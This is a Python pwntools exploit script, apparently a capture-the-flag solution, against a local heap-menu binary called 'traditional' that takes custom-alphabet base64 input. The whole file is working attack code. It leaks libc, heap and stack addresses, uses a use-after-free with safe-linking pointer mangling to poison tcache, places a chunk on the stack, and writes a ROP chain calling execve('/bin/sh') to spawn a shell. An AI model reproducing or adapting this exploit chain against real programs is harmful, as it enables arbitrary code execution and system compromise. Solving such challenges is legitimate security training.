from pwn import *
import base64
import time
context(arch='amd64', os='linux',log_level='debug')
context.terminal=['cmd.exe','/c','start','cmd.exe','/k','wsl.exe','bash','-lc']
std=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
custom=b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
enc_table=bytes.maketrans(std,custom)
def base64enc(data):
    return base64.b64encode(data).translate(enc_table)

def base64num(num):
    s=str(num).encode()
    return base64.b64encode(s).translate(enc_table)

io=process('./traditional')
elf=ELF('./traditional')
libc = ELF('./libc.so.6')

def add(size,idx):
    io.sendlineafter(b'choice: ', base64enc(b'1'))
    io.sendline(base64num(size)) 
    io.sendline(base64num(idx))
def edit(idx,content):
    io.sendlineafter(b'choice: ', base64enc(b'2'))
    io.sendline(base64num(idx))
    io.sendline(base64enc(content))
def show(idx):
    io.sendlineafter(b'choice: ', base64enc(b'3'))
    io.sendline(base64num(idx))
    data=io.recvuntil(b"[DONE] handle_show",drop=True)
    return data
def delete(idx):
    io.sendlineafter(b'choice: ', base64enc(b'4'))
    io.sendline(base64num(idx))
def quit():
    io.sendlineafter(b'choice: ', base64enc(b'5'))
def copy(src,dst,len):
    io.sendlineafter(b'choice: ', base64enc(b'7'))
    io.sendline(base64num(src))
    io.sendline(base64num(dst))
    io.sendline(base64num(len))


for i in range(8):
    add(0x100,i)

for i in range(1,8):
    delete(i)
delete(0)
for i in range(1, 8):
    add(0x100, i)

add(0x100,0)
data=show(0)
leak=u64(data[:6].ljust(8,b'\x00'))
libc.address=leak-0x233c20
log.success(f'libc base={libc.address:#x}')

data=show(7)
heap=u64(data[:5].ljust(8,b'\x00'))<<12
log.success(f'heap base={heap:#x}')


add(0x380,14)
add(0x380,15)
delete(0x80|14)
delete(14)


uaf_chunk=heap+0xf20
old_fd=u64(show(15)[:8].ljust(8,b'\x00'))
assert old_fd == ((uaf_chunk-0x390) ^ (uaf_chunk>>12))
log.success(f'uaf chunk={uaf_chunk:#x}')


environ=libc.address+0x23ae28
target=environ-0x18
edit(15,p64(target ^ (uaf_chunk>>12)))
add(0x380,14)
add(0x380,13)


edit(1,b'A'*0x30)
copy(1,13,0x18)
data=show(13)
stack=u64(data[0x18:0x18+6].ljust(8,b'\x00'))
log.success(f'stack={stack:#x}')

stack_target=stack-0x148
log.success(f'saved rbp target={stack_target:#x}')


add(0xc0,8)
add(0xa0,9)
add(0x100,10)
add(0x100,11)
add(0xa0,12)

victim=uaf_chunk+0x460
log.success(f'victim chunk={victim:#x}')


edit(10,b'B'*0x60+p64(stack_target ^ (victim>>12)))
delete(12)
delete(9)
copy(11,10,0xfffffff0)

add(0xa0,9)
add(0xa0,12)

# ROP 链全部用直接偏移，不用 ROP() 自动找
ret=libc.address+0x28842
pop_rdi=libc.address+0x11b87a
pop_rsi=libc.address+0x5c207
pop_rdx=libc.address+0x48c92
bin_sh=libc.address+0x1db4c3
execve=libc.address+0xf86c0

payload=p64(0)+flat(
    ret,
    pop_rdi,bin_sh,
    pop_rsi,0,
    pop_rdx,0,
    execve
)
edit(12,payload)
quit()

io.interactive()
